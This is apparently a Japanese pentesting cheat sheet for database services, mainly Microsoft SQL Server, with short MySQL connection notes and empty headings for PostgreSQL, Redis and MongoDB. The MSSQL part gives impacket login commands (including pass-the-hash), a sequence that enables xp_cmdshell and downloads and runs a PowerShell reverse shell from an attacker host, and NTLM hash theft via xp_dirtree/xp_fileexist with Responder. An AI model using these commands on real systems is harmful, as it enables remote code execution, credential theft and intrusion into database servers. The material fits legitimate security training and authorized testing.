# Microsoft SQL Server
## Default account
sa
## Default Port
1433
## Connection
`-windows-auth`が不要な場合あり。  
`-k`はkerberos認証で環境変数`$KRB5CCNAME`からチケットのキャッシュを参照する。  
`-hashes`はNTLMハッシュでの認証。
```
impacket-mssqlclient <User>@<Target> -windows-auth
impacket-mssqlclient <User>:<Password>@<Target> -windows-auth
impacket-mssqlclient -k <User>@<Target> -windows-auth
impacket-mssqlclient -hashes :<NTLM HASH> <User>@<Target>
```
## sysadmin
サーバーに対するすべての操作を実行できる権限。
### sysadminによるRCE
`SELECT IS_SRVROLEMEMBER('sysadmin')`の結果が1であればsysadmin
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell "powershell -c iex(new-object net.webclient).downloadstring('http://<YOUR IP>/revshell.ps1')";
```
## xp_dirtree, xp_fileexist
Windowsファイルシステムにアクセスできるストアドプロシージャ。
### xp_dirtree, xp_fileexistによるNTLMハッシュ奪取
攻撃端末でSMBサーバーを起動する。  
`sudo responder -I tun0`
```
EXEC xp_dirtree '\\<YOUR IP>\<Share>'
EXEC xp_fileexist '\\<YOUR IP>\<Share>'
```
# MySQL
## Default account
root
## Default password

## Default Port
3306, 33060
## Connection
`-p`はパスワードとの間にスペース不要。入力しない場合は要求される。  
`-e`を使うとローカルのMySQLに接続すると同時にクエリを実行する。  
`-ssl=0`を使うとTLS/SSL接続をしないまま接続する。
```
mysql -h <Target> -P <Port> -u <User> -p<Password>
mysql -h <Target> -P <Port> -u <User> -p
mysql -u <User> -p<Password> -e '<Query>;'
```
# PostgreSQL
# Redis
# MongoDB
